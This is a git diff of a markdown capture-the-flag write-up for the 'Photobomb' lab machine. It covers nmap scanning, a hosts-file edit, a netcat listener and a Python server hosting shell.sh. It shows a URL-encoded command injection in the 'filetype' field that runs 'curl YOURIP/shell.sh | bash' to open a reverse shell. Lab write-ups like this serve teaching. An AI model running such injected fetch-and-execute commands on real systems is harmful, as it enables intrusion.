@@ -1,6 +1,6 @@
 # Photobomb
 ## Part 1: Discovery
-- ### Scanning
+### Scanning
 I have scanned the ip address of the machine using nmap
 ``` sudo nmap -sVC -T4 -p- machine_ip ```<br/>
 According to the nmap result there are 2 services serving on port 22 and port 80. <br/>
@@ -13,7 +13,7 @@ PORT   STATE SERVICE REASON         VERSION
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-title: Did not follow redirect to http://photobomb.htb/
 ```
-- ### Investigating the website
+### Investigating the website
 When the website is visited, It is not available. We need to configure our local dns server to make possible to visit the website. <br/>
 ``` sudo vi /etc/hosts```<br/>
 After opening the vi editor, insert: ```machine_ip photobomb.htb```. <br/>
@@ -30,7 +30,7 @@ We can use this opening to feed our reverse shell into the sever.<br/>
 
 
  ## Part 2 : Exploiting
- - ### Preping a reverse shell
+ ### Preping a reverse shell
  I wanted to make this website pull a shell script from my ip. For this purpose; <br/>
  - I have opened a netcast listener on port 443. When the shell script has run, listener will catch and makes us traverse the server directories.<br/>
  - We are going to make the website pull shell script from a python http server which is running on port 8080.<br/>
@@ -41,7 +41,7 @@ We can use this opening to feed our reverse shell into the sever.<br/>
  - URL encode ```curl your_ip:python_server_port/shell.sh|bash``` This will be fed to the target system to pull our shell script.
  Our Reverse Shell is ready to be pulled. It is time to feed the shell to the target system.
  
- - ### Feeding the shell
+ ### Feeding the shell
  As I mentioned before, the filetype is being sent to the backend. we can make the target computer run a spesific command from here. <br/>
  - First: we paste our url encoded curl command next to the filetype in burpsuite and proceed to download the images: <br/>  ```photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=jpg;curl%20YOURIP%3APYTHONPORT%2Fshell.sh%20%7C%20bash&dimensions=3000x2000``` <br/> Images will not be downloaded and our shell is serving on our listener.
  - You can see at the listener ```connect to [your_ip] from (UNKNOWN) [target_ip] 51488``` We are succesfully penetrated into the target system.
